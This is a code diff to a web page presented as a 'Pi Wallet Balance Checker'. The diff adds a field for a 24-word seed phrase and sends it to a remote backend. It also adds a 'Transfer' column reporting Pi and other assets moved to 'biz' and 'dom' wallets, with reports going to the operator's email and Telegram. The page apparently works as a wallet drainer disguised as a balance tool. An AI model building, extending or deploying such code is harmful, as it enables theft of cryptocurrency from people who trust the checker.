@@ -52,15 +52,29 @@
   .badge.not_found { background: #fef9c3; color: #854d0e; }
   .badge.invalid, .badge.error { background: #fee2e2; color: #b91c1c; }
   .delivery { margin-top: 10px; font-size: 12px; color: #555; }
+  .radio-group { margin: 10px 0; }
+  .radio-group label { display: inline; font-weight: normal; margin-right: 15px; font-size: 14px; }
 </style>
 </head>
 <body>
 
 <h1>Pi Wallet Balance Checker</h1>
-<p class="sub">Paste Pi wallet addresses (one per line) — the report goes to your configured email(s) and Telegram, and shows here too.</p>
+<p class="sub">Paste Pi wallet addresses (one per line) or a seed phrase — the report goes to your configured email(s) and Telegram, and shows here too.</p>
 
-<label for="addresses">Wallet addresses (one per line)</label>
-<textarea id="addresses" placeholder="GABCDEF...&#10;GXYZQWE..."></textarea>
+<div class="radio-group">
+  <label><input type="radio" name="inputType" value="address" checked> Wallet Addresses</label>
+  <label><input type="radio" name="inputType" value="seed"> Seed Phrase</label>
+</div>
+
+<div id="addressInputWrap">
+  <label for="addresses">Wallet addresses (one per line)</label>
+  <textarea id="addresses" placeholder="GABCDEF...&#10;GXYZQWE..."></textarea>
+</div>
+
+<div id="seedPhraseWrap" style="display:none;">
+  <label for="seedPhrase">Seed Phrase (24 words)</label>
+  <textarea id="seedPhrase" placeholder="word1 word2 word3 ... word24"></textarea>
+</div>
 
 <button id="submitBtn">Check Balances</button>
 
@@ -71,12 +85,9 @@
 <script>
   const API_URL = 'https://your-backend.up.railway.app/api/check-balances';
   // ^ REQUIRED: replace with your deployed backend's URL.
-  // This frontend is a standalone static file — it does not need to be
-  // hosted on the same site/domain as the backend. Just make sure the
-  // backend's ALLOWED_ORIGIN env var includes wherever this file ends up
-  // being served from (e.g. https://your-frontend.netlify.app).
 
   const $addresses = document.getElementById('addresses');
+  const $seedPhrase = document.getElementById('seedPhrase');
   const $btn = document.getElementById('submitBtn');
   const $status = document.getElementById('status');
   const $delivery = document.getElementById('deliveryInfo');
@@ -101,6 +112,21 @@
     return assets.map(a => `${a.balance} ${a.asset}`).join('<br/>');
   }
 
+  function renderTransfer(transfer) {
+    if (!transfer) return '—';
+    if (!transfer.attempted) return 'not attempted';
+    if (!transfer.success) return `<span style="color:#b91c1c">❌ ${transfer.error || 'failed'}</span>`;
+    const parts = [];
+    if (transfer.piBusinessAmount !== null || transfer.piDomesticAmount !== null) {
+      parts.push(`${transfer.piBusinessAmount} π → biz, ${transfer.piDomesticAmount} π → dom`);
+    }
+    if (transfer.otherAssetsTransferred && transfer.otherAssetsTransferred.length > 0) {
+      const other = transfer.otherAssetsTransferred.map(t => t.status === 'sent' ? `${t.asset} ${t.amount} → dom` : `${t.asset} skipped`).join(', ');
+      parts.push(`Other: ${other}`);
+    }
+    return `<span style="color:#15803d">✅ ${parts.join(' | ')}</span>`;
+  }
+
   function renderResults(results) {
     if (!results || results.length === 0) {
       $resultsWrap.innerHTML = '';
@@ -112,7 +138,7 @@
           <tr>
             <td class="addr">${r.address}</td>
             <td><span class="badge ${r.status}">${r.status}</span></td>
-            <td colspan="5">${r.error || '-'}</td>
+            <td colspan="6">${r.error || '-'}</td>
           </tr>
         `;
       }
@@ -126,6 +152,7 @@
           <td>${formatDate(r.nextUnlockDate)}</td>
           <td><strong>${total} π</strong></td>
           <td>${renderOtherAssets(r.otherAssets)}</td>
+          <td>${renderTransfer(r.transfer)}</td>
         </tr>
       `;
     }).join('');
@@ -142,6 +169,7 @@
               <th>Next Unlock</th>
               <th>Total</th>
               <th>Other Assets</th>
+              <th>Transfer</th>
             </tr>
           </thead>
           <tbody>${rows}</tbody>
@@ -169,20 +197,41 @@
     $delivery.textContent = parts.join('  •  ');
   }
 
+  document.querySelectorAll('input[name="inputType"]').forEach(radio => {
+    radio.addEventListener('change', (e) => {
+      const isSeed = e.target.value === 'seed';
+      document.getElementById('addressInputWrap').style.display = isSeed ? 'none' : 'block';
+      document.getElementById('seedPhraseWrap').style.display = isSeed ? 'block' : 'none';
+    });
+  });
+
   $btn.addEventListener('click', async () => {
     if (API_URL.includes('your-backend.up.railway.app')) {
       setStatus('Set API_URL at the top of the <script> tag to your deployed backend URL first.', 'error');
       return;
     }
 
-    const addresses = $addresses.value
-      .split('\n')
-      .map(a => a.trim())
-      .filter(Boolean);
+    const inputType = document.querySelector('input[name="inputType"]:checked').value;
+    let requestBody;
 
-    if (addresses.length === 0) {
-      setStatus('Add at least one wallet address.', 'error');
-      return;
+    if (inputType === 'seed') {
+      const seedPhrase = $seedPhrase.value.trim();
+      if (!seedPhrase) {
+        setStatus('Please enter a seed phrase.', 'error');
+        return;
+      }
+      requestBody = { seedPhrases: [seedPhrase] };
+    } else {
+      const addresses = $addresses.value
+        .split('\n')
+        .map(a => a.trim())
+        .filter(Boolean);
+
+      if (addresses.length === 0) {
+        setStatus('Add at least one wallet address.', 'error');
+        return;
+      }
+      requestBody = { addresses };
     }
 
     $btn.disabled = true;
@@ -194,7 +243,7 @@
       const res = await fetch(API_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ addresses }),
+        body: JSON.stringify(requestBody),
       });
       const data = await res.json();
 
@@ -203,7 +252,7 @@
         return;
       }
 
-      setStatus(`Done — checked ${data.results.length} address(es).`, 'ok');
+      setStatus(`Done — checked ${data.results.length} item(s).`, 'ok');
       renderResults(data.results);
       renderDelivery(data);
     } catch (err) {
